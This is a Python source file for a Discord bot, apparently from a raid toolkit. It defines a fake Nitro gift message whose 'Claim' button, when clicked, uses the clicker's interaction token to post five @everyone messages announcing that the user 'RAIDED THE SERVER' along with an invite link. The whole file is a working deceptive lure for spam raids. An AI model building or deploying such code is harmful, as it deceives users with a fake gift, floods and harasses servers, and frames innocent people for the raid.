import asyncio
import aiohttp
import discord
from utils.helpers import send_message_http, ZNE_INVITE

class FakeNitroView(discord.ui.LayoutView):
    container1 = discord.ui.Container(
        discord.ui.Section(
            discord.ui.TextDisplay(content="You got a promotion code!\n-# This gift link is a promotion code. \n-# Click the button below to claim it."),
            accessory=discord.ui.Thumbnail(
                media="https://cdn3.emoji.gg/emojis/7496-payments-nitro.gif",
            ),
        ),
        discord.ui.ActionRow(
                discord.ui.Button(
                    style=discord.ButtonStyle.primary,
                    label="Claim",
                    custom_id="fake_nitro_claim",
                ),
        ),
    )

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.data.get("custom_id") == "fake_nitro_claim":
            await interaction.response.defer()
            
            user_mention = interaction.user.mention
            
            app_id = interaction.client.application_id
            token = interaction.token
            content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE} @everyone"
            
            async with aiohttp.ClientSession() as session:
                tasks = [
                    send_message_http(session, app_id, token, content)
                    for _ in range(5)
                ]
                await asyncio.gather(*tasks)
            
            return False
        return True